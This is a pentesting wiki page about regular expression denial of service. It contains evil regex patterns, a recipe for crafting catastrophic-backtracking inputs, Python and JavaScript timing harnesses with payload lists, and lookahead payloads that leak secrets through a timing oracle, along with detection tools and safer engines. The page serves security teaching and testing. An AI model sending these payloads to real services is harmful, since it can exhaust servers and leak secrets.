---
title: "Regular expression Denial of Service - ReDoS"
source: hacktricks.wiki
source_url: https://hacktricks.wiki/pentesting-web/regular-expression-denial-of-service-redos.html
fetched_at: 2026-09-20T09:50:19Z
license: unspecified
category: web
---

## The Problematic Regex Naïve Algorithm

**Check the details in [https://owasp.org/www-community/attacks/Regular*expression_Denial_of_Service*-_ReDoS](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS)**[\[1\]](#references)

### Engine behavior and exploitability

- Widely used engines such as PCRE, Java `java.util.regex` , Python`re` , and JavaScript`RegExp` use backtracking for relevant pattern features. Crafted inputs that create many overlapping ways to match a subpattern can force exponential or high-polynomial work.<sup>[\[5\]](#references)</sup>
- Some engines/libraries are designed to be **ReDoS-resilient** by construction (no backtracking), e.g.**RE2** and ports based on finite automata that provide worst‑case linear time; using them for untrusted input removes the backtracking DoS primitive. See the references at the end for details.<sup>[\[5\]](#references)[\[6\]](#references)</sup>

## Evil Regexes

An “evil regex” is a pattern that performs excessive work on a crafted input. Common warning signs include a repeated group containing another repetition or overlapping alternatives.[\[1\]](#references)[\[5\]](#references)

- (a+)+
- ([a-zA-Z]+)*
- (a|aa)+
- (a|a?)+
- (.*a){x} for x > 10

All those are vulnerable to the input `aaaaaaaaaaaaaaaaaaaaaaaa!`.

### Practical recipe to build PoCs

Most catastrophic cases follow this shape:

- Prefix that gets you into the vulnerable subpattern (optional).
- Long run of a character that causes ambiguous matches inside nested/overlapping quantifiers (e.g., many `a` ,`_` , or spaces).
- A final character that forces overall failure so the engine must backtrack through all possibilities (often a character that won’t match the last token, like `!` ).

Minimal examples:

- `(a+)+$` vs input`"a"*N + "!"`
- `\w*_*\w*$` vs input`"v" + "_"*N + "!"`

Increase N and observe super‑linear growth.

#### Quick timing harness (Python)

```
import re, time
pat = re.compile(r'(\w*_)\w*$')
for n in [2**k for k in range(8, 15)]:
    s = 'v' + '_'*n + '!'
    t0=time.time(); pat.search(s); dt=time.time()-t0
    print(n, f"{dt:.3f}s")
```
## ReDoS Payloads

### String Exfiltration via ReDoS

In an authorized CTF or assessment, an attacker may control a regex that is evaluated against a secret. A lookahead can make the catastrophic portion run only when a guessed prefix matches, turning response time into an oracle that reveals the secret one character at a time:[\[2\]](#references)[\[3\]](#references)[\[4\]](#references)

- In [**this post**](https://portswigger.net/daily-swig/blind-regex-injection-theoretical-exploit-offers-new-way-to-force-web-apps-to-spill-secrets) you can find this ReDoS rule:`^(?=<flag>)((.*)*)*salt$`<sup>[\[2\]](#references)</sup>  - Example: `^(?=HTB{sOmE_fl§N§)((.*)*)*salt$`
- Example:
- In [**this writeup**](https://github.com/jorgectf/Created-CTF-Challenges/blob/main/challenges/TacoMaker%20@%20DEKRA%20CTF%202022/solver/solver.html) you can find this one:`<flag>(((((((.*)*)*)*)*)*)*)!`<sup>[\[3\]](#references)</sup>
- In [**this writeup**](https://ctftime.org/writeup/25869) he used:`^(?=${flag_prefix}).*.*.*.*.*.*.*.*!!!!$`<sup>[\[4\]](#references)</sup>

### ReDoS Controlling Input and Regex

The following are **ReDoS** examples where you **control** both the **input** and the **regex**:

```
function check_time_regexp(regexp, text) {
  var t0 = new Date().getTime()
  new RegExp(regexp).test(text)
  var t1 = new Date().getTime()
  console.log("Regexp " + regexp + " took " + (t1 - t0) + " milliseconds.")
}
// These payloads work because the input has many "a" characters
;[
  //  "((a+)+)+$",  //Eternal,
  //  "(a?){100}$", //Eternal
  "(a|a?)+$",
  "(\\w*)+$", //Generic
  "(a*)+$",
  "(.*a){100}$",
  "([a-zA-Z]+)*$", //Generic
  "(a+)*$",
].forEach((regexp) => check_time_regexp(regexp, "aaaaaaaaaaaaaaaaaaaaaaaaaa!"))
/*
Regexp (a|a?)+$ took 5076 milliseconds.
Regexp (\w*)+$ took 3198 milliseconds.
Regexp (a*)+$ took 3281 milliseconds.
Regexp (.*a){100}$ took 1436 milliseconds.
Regexp ([a-zA-Z]+)*$ took 773 milliseconds.
Regexp (a+)*$ took 723 milliseconds.
*/
```
### Language and Engine Notes

- JavaScript (browser/Node): Built-in `RegExp` can backtrack and becomes a ReDoS sink when a vulnerable pattern processes attacker-influenced input.
- Python: `re` is backtracking. Long ambiguous runs plus a failing tail often yield catastrophic backtracking.
- Java: `java.util.regex` is backtracking. If you only control input, look for endpoints using complex validators; if you control patterns (e.g., stored rules), ReDoS is usually trivial.
- Engines such as **RE2/RE2J/RE2JS** or the**Rust regex** crate avoid catastrophic backtracking for supported syntax. Resource exhaustion can still arise from huge inputs, patterns, captures, or surrounding application logic.<sup>[\[5\]](#references)[\[6\]](#references)</sup>

## Tools

- `regexploit` detects vulnerable regexes and generates candidate inputs.<sup>[\[7\]](#references)</sup>  - Find vulnerable regexes and auto‑generate evil inputs. Examples:
    - `pip install regexploit`
    - Analyze one pattern interactively: `regexploit`
    - Scan Python/JS code for regexes: `regexploit-py path/` and`regexploit-js path/`
- Find vulnerable regexes and auto‑generate evil inputs. Examples:
- The Devina ReDoS checker provides an interactive pattern check.<sup>[\[8\]](#references)</sup>
- `vuln-regex-detector` extracts regexes from projects, detects candidates, and validates them in the target language.<sup>[\[9\]](#references)</sup>  - End‑to‑end pipeline to extract regexes from a project, detect vulnerable ones, and validate PoCs in the target language. Useful for hunting through large codebases.
- `redos-detector` is a JavaScript library/CLI that analyzes backtracking behavior.<sup>[\[10\]](#references)</sup>  - Simple CLI/JS library that reasons about backtracking to report if a pattern is safe.

Tip: When you only control input, generate strings with doubling lengths (e.g., 2^k characters) and track latency. Exponential growth strongly indicates a viable ReDoS.

## References
